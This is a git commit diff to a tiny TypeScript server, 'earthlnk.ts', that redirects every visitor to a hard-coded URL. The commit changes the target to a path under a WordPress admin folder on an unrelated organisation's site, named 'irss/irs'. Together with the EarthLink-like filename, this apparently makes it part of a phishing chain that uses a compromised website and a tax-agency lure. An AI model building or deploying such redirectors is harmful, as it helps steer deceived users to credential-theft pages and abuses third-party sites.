145e96c0c069332faae99561254f9b9555a99786
Digital2025001 <bosmichael30@gmail.com>
2025-10-19 12:05:23 -0500

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://veronawalksales.com/", // Replace this with your actual link
+      Location: "https://cemexicano.org/wp-admin/irss/irs", // Replace this with your actual link
     },
   });
 });
